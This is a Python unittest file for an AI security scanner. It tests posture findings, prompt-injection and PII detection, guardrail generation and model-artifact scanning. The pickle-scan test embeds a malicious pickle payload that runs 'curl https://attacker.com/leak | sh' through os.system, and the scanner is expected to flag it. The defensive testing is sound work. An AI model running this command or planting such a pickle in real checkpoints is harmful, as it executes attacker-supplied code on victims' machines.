import json, unittest, hashlib, importlib.machinery, importlib.util

def load_ai_cli():
    loader = importlib.machinery.SourceFileLoader("aicli", "bin/aisecure-cli")
    spec = importlib.util.spec_from_loader(loader.name, loader)
    cli = importlib.util.module_from_spec(spec)
    loader.exec_module(cli)
    return cli

class TestAiSecureEngine(unittest.TestCase):
    def setUp(self):
        with open("fixtures/sample-ai-inventory.json", "r", encoding="utf-8") as f:
            self.inventory = json.load(f)
        with open("fixtures/sample-prompts.json", "r", encoding="utf-8") as f:
            self.prompts = json.load(f)
        self.cli = load_ai_cli()

    def test_fixtures_loaded(self):
        self.assertEqual(len(self.inventory), 5)
        self.assertEqual(len(self.prompts), 4)

    def test_ai_posture_findings(self):
        all_findings = []
        for a in self.inventory:
            all_findings.extend(self.cli.evaluate_asset(a))

        self.assertEqual(len(all_findings), 7)
        rule_ids = {f["rule_id"] for f in all_findings}
        expected_rules = {"LLM10:2025", "LLM08:2025", "LLM07:2025", "SHADOW-AI-001"}
        self.assertEqual(rule_ids, expected_rules)

        # Check critical count
        criticals = [f for f in all_findings if f["severity"] == "CRITICAL"]
        self.assertEqual(len(criticals), 4)

        # Verify model weights theft
        theft_f = next(f for f in all_findings if f["rule_id"] == "LLM10:2025" and "Publicly" in f["title"])
        self.assertEqual(theft_f["resource_id"], "asset-weights-01")

        # Verify autonomous tool execution
        tool_f = [f for f in all_findings if f["rule_id"] == "LLM07:2025"]
        self.assertEqual(len(tool_f), 2)
        tool_names = {f["resource_id"].split(":")[-1] for f in tool_f}
        self.assertEqual(tool_names, {"execute_ledger_mutation", "bash_terminal_exec"})

        # Verify Shadow AI
        shadow_f = next(f for f in all_findings if f["rule_id"] == "SHADOW-AI-001")
        self.assertEqual(shadow_f["resource_id"], "asset-shadow-01")

        # Verify clean approved asset generates 0 findings
        bedrock_asset = next(a for a in self.inventory if a["id"] == "asset-bedrock-approved")
        self.assertEqual(len(self.cli.evaluate_asset(bedrock_asset)), 0)

    def test_prompt_injection_detection(self):
        all_findings = []
        for p in self.prompts:
            all_findings.extend(self.cli.inspect_prompt(p))

        self.assertEqual(len(all_findings), 3)
        rule_ids = {f["rule_id"] for f in all_findings}
        self.assertEqual(rule_ids, {"LLM01:2025", "LLM06:2025"})

        inj_f = [f for f in all_findings if f["rule_id"] == "LLM01:2025"]
        self.assertEqual(len(inj_f), 2)

        leak_f = next(f for f in all_findings if f["rule_id"] == "LLM06:2025")
        self.assertIn("System Prompt Extraction", leak_f["title"])

        # Clean prompt generates 0 findings
        clean_prompt = self.prompts[3]
        self.assertEqual(len(self.cli.inspect_prompt(clean_prompt)), 0)

    def test_guardrail_synthesis(self):
        findings = []
        for a in self.inventory:
            findings.extend(self.cli.evaluate_asset(a))
        for p in self.prompts:
            findings.extend(self.cli.inspect_prompt(p))

        cf_json, in_rules, out_rules = self.cli.synthesize_guardrails(findings)
        gw = json.loads(cf_json)
        self.assertEqual(gw["name"], "CloudSecure-AI-Gateway")
        self.assertTrue(gw["enforce_guardrails"])
        self.assertTrue(gw["routing"]["block_unapproved_shadow_ai"])

        self.assertTrue(len(in_rules) >= 2)
        self.assertIn("deny_prompts_with_jailbreak_delimiters", in_rules)
        self.assertIn("filter_system_prompt_canary_leakage", out_rules)

    def test_model_artifact_pickle_scan(self):
        # 1. SafeTensors model artifact
        res_safe = self.cli.scan_model_artifact("model.safetensors", b"\x00\x00\x00\x00\x00\x00\x00\x00{}")
        self.assertTrue(res_safe["is_safe"])
        self.assertEqual(res_safe["format"], "safetensors")
        self.assertEqual(len(res_safe["findings"]), 0)

        # 2. GGUF model artifact
        res_gguf = self.cli.scan_model_artifact("llama3.gguf", b"GGUF\x03\x00\x00\x00")
        self.assertTrue(res_gguf["is_safe"])
        self.assertEqual(res_gguf["format"], "gguf")
        self.assertEqual(len(res_gguf["findings"]), 0)

        # 3. Malicious pickle checkpoint containing os.system / GLOBAL / REDUCE
        malicious_bytes = b"cos.system\n(S'curl https://attacker.com/leak | sh'\ntR."
        res_mal = self.cli.scan_model_artifact("checkpoint.pt", malicious_bytes)
        self.assertFalse(res_mal["is_safe"])
        self.assertEqual(res_mal["format"], "pickle")
        self.assertIn("os.system", res_mal["detected_opcodes"])
        self.assertEqual(len(res_mal["findings"]), 1)
        self.assertEqual(res_mal["findings"][0]["rule_id"], "AI-SPM-006")
        self.assertEqual(res_mal["findings"][0]["severity"], "CRITICAL")

    def test_prompt_pii_firewall(self):
        # Test prompt containing OpenAI API key
        p_key = {
            "id": "prompt-key-leak",
            "prompt_text": "Here is my OpenAI API key: sk-proj-123456789012345678901234567890, please check it.",
            "source": "api",
            "target_model": "gpt-4o"
        }
        f_key = self.cli.inspect_prompt(p_key)
        self.assertEqual(len(f_key), 1)
        self.assertEqual(f_key[0]["rule_id"], "LLM06:2025")
        self.assertIn("API Key", f_key[0]["title"])

        # Test prompt containing SSN
        p_ssn = {
            "id": "prompt-ssn-leak",
            "prompt_text": "Verify user with SSN 123-45-6789 for KYC review.",
            "source": "api",
            "target_model": "gpt-4o"
        }
        f_ssn = self.cli.inspect_prompt(p_ssn)
        self.assertEqual(len(f_ssn), 1)
        self.assertEqual(f_ssn[0]["rule_id"], "LLM06:2025")
        self.assertIn("Social Security Number", f_ssn[0]["title"])

    def test_deterministic_ai_asset_hash(self):
        for a in self.inventory:
            raw = f"{a['id']}:{a['name']}:{a['asset_type']}:{a['provider']}"
            digest = hashlib.sha256(raw.encode("utf-8")).hexdigest()
            self.assertEqual(len(digest), 64)

if __name__ == "__main__":
    unittest.main()
